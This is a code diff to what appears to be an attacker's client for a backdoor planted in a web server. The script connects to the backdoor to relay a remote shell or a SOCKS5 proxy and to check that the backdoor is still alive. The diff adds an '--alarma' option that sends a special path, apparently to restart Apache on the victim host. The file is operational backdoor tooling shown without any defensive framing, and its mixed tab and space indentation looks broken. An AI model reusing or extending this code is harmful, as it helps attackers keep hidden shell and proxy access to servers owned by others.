@@ -27,6 +27,9 @@ def worker(afference, addr):
         if args.socks5:
             path = "/w41t1ngR00M"
 
+        if args.alarma:
+            path = "/ALARMA"
+
         BackdoorMod = connector(path)
         BackdoorMod.setblocking(0)
         afference.setblocking(0)
@@ -59,8 +62,10 @@ def relay():
     try:
         if args.socks5:
             point = int(args.socks5)
-        if args.shell:
+        if args.shell: 
             point = int(args.shell)
+        if args.alarma: 
+            point = 1082
 
         s.bind(("0.0.0.0",point))
     except Exception as err:
@@ -103,6 +108,7 @@ parser.add_argument('--socks5', dest='socks5', help='Set port for proxychains')
 parser.add_argument('--debug', dest='debug', action='store_true', help='Enable debug mode')
 parser.add_argument('--ping', dest='ping', action='store_true', help='Check if backdoor still alive')
 parser.add_argument('--shell', dest='shell', help="Set Local Port for shell (NO TTY)")
+parser.add_argument('--alarma', dest='alarma', help="Restart Apache2")
 args = parser.parse_args()
 
 
@@ -115,7 +121,11 @@ if __name__ == '__main__':
 		print("[+] Starting local server for incoming connections at port " + args.socks5)
 		relay()
 	if args.ping:
-	   	ping()
+            ping()
 	if args.shell:
-                print("[+] Starting local server for incoming connections at port " + args.shell)
-                relay()
+            print("[+] Starting local server for incoming connections at port " + args.shell)
+            relay()
+        if args.alarma:
+            print("[+] Restarting Apache2 ")
+            relay()
+
